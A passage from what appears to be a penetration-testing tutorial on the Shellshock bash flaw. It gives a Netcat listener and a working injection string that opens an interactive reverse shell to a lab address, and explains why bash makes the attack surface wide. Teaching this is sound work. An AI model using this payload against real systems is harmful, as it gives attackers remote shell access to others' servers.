Now that you've found the correct injection command, you can try to gain direct shell access to the servers. For this, first set up your listener using Netcat as follows:

```
nc -lvp 12345
```

Then inject the command. This time, you are injecting a more advanced command that will yield a fully interactive shell if successful:

```
() { :;}; /bin/bash -c "ping -c 1 10.7.7.4; bash -i >& /dev/tcp/10.7.7.4/12345 0>&1"
```

![](bbox=[0.13, 0.3, 0.87, 0.58])

The bash shell interprets the variable as a command and executes it instead of accepting the variable as a sequence of characters. This looks very similar to the command injection flaw discussed earlier. The major difference here, however, is that the bash shell itself is vulnerable to code injection rather than the website. Since the bash shell is used by many applications, such as DHCP, SSH, SIP, and SMTP, the attack surface is increased to a great extent. Exploiting the flaw over HTTP requests is still the most common way to do it, as bash shell is often used along with CGI scripts.

![](bbox=[0.16, 0.76, 0.23, 0.81])

To identify CGI scripts in web servers, apart from the analysis of requests and responses using proxies, Nikto and DIRB can also be used.